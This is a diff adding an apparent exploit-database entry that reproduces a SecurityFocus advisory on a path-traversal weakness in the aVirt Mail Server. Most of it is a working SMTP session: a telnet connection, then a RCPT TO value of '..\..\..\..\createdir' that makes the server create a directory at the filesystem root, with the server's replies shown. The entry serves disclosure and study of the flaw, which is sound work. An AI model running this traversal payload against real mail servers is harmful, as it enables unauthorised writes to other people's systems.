@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/764/info
+
+The aVirt Mail Server has a weakness in the code that handles the RCPT TO command. By specifying a path in the command instead of an email recipient , an attacker could cause the mail server to create a directory in the server's local filesystem.
+
+telnet targethost:25
+
+> 220 server aVirt Mail SMTP Server Ready.
+MAIL FROM: user
+> 250 user, Sender OK
+rcpt to:..\..\..\..\createdir
+> 250 ..\..\..\..\createdir, Recipient OK
+data
+> 354 Please enter mail, ending with a "." on a line by itself
+blablabla
+.
+> 250 Mail accepted.
+
+This will cause the mail server to create a root directory called "createdir", which will contain 1 file. Testing indicates that this method cannot be used to overwrite existing folders. 
